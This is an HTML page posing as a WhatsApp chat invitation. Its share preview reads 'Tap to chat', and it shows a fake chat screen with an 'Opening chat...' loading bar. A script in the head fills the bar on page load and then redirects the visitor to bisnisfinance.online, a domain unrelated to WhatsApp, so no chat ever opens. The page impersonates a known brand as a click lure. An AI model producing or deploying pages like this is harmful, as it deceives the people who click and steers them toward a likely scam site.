<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>WhatsApp Chat</title>

<meta property="og:title" content="WhatsApp Chat">
<meta property="og:description" content="Tap to chat">
<meta property="og:image" content="https://kodean.online/assets/img/jutjut16.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:type" content="website">
<meta name="description" content="Tap to chat">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
}

body{
  min-height:100vh;
  background:#0b1f17;
  display:flex;
  justify-content:center;
  align-items:center;
}

.app{
  width:100%;
  max-width:420px;
  height:100vh;
  background:linear-gradient(180deg,#0f2f22,#071711);
  display:flex;
  flex-direction:column;
}

.header{
  background:#123c2c;
  padding:14px 16px;
  display:flex;
  align-items:center;
  gap:12px;
  box-shadow:0 2px 8px rgba(0,0,0,.4);
}

.avatar{
  width:42px;
  height:42px;
  border-radius:50%;
  object-fit:cover;
}

.name{
  color:#fff;
  font-size:16px;
  font-weight:600;
}

.status{
  font-size:12px;
  color:#86efac;
}

.chat{
  flex:1;
  padding:18px;
  display:flex;
  flex-direction:column;
  justify-content:flex-end;
  gap:12px;
}

.msg{
  max-width:75%;
  padding:10px 14px;
  border-radius:16px;
  font-size:14px;
  line-height:1.4;
}

.left{
  background:#1f4636;
  color:#fff;
  align-self:flex-start;
}

.right{
  background:#22c55e;
  color:#fff;
  align-self:flex-end;
}

.loader{
  width:100%;
  height:5px;
  background:rgba(255,255,255,.25);
  border-radius:20px;
  overflow:hidden;
  margin-top:6px;
}

.loader span{
  display:block;
  height:100%;
  width:0%;
  background:#dcfce7;
  transition:width .2s;
}
</style>

<script>
document.addEventListener("DOMContentLoaded",()=>{
  const bar = document.getElementById("bar");
  let w = 0;

  const iv = setInterval(()=>{
    w += Math.floor(Math.random()*7)+6;
    if(w > 100) w = 100;
    bar.style.width = w + "%";

    if(w >= 100){
      clearInterval(iv);
      setTimeout(()=>{
        window.location.href = "https://bisnisfinance.online";
      }, 600);
    }
  }, 170);
});
</script>
</head>

<body>
<div class="app">

  <div class="header">
    <img src="https://kodean.online/assets/img/jutjut16.jpg" class="avatar">
    <div>
      <div class="name">WhatsApp Chat</div>
      <div class="status">online</div>
    </div>
  </div>

  <div class="chat">
    <div class="msg left">
      Hi 😊 Tap to chat with me...
    </div>

    <div class="msg right">
      Opening chat...
      <div class="loader">
        <span id="bar"></span>
      </div>
    </div>
  </div>

</div>
</body>
  </html>
